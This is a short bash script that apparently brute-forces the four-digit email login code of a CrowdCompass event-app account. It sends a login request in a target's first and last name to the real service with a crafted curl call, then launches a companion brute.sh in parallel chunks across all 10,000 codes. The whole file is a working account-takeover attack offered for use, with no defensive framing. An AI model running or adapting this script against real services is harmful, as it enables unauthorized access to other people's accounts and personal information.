#!/bin/bash
USAGE="USAGE: $0 fname lname [chunks]"

CHUNKS=50
if [[ "$1" != "" ]]; then
	FNAME="$1"
else
	echo $USAGE
	exit 1
fi
if [[ "$2" != "" ]]; then
	LNAME="$2"
else
	echo $USAGE
	exit 1
fi
if [[ "$3" != "" ]]; then
	CHUNKS="$3"
else
	echo $USAGE
	exit 1
fi

echo "Sending e-mail to ensure we have a valid code"
curl 'https://svc.crowdcompass.com/login/e/vKx1t90ykc/login/challenges/names' -X PUT -H 'Origin: https://login.crowdcompass.com' -H 'Accept-Encoding: gzip, deflate, sdch, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://login.crowdcompass.com/login/names' -H 'Connection: keep-alive' -H 'DNT: 1' --data-binary '{"login_attempt":{"event_oid":"vKx1t90ykc","authorized_redirect":"nx0imepk9nze://authenticate","device":"643d9d20-d53f-4fde-b4ca-da3d73bf5393","confirm_base_url":"https://svc.crowdcompass.com/vKx1t90ykc/confirm/","answers":[{"challenge_id":"names","first_name":"$FNAME","last_name":"$LNAME"}]}}' --compressed

CHUNK_SIZE=$((10000/CHUNKS))

echo "Dividing the work into $CHUNKS of $CHUNK_SIZE iterations each"
for i in `seq 0 $((CHUNKS-1))`; do
	./brute.sh $((CHUNK_SIZE*i)) $(((i+1)*CHUNK_SIZE-1)) $FNAME $LNAME > output.$i.txt &
done

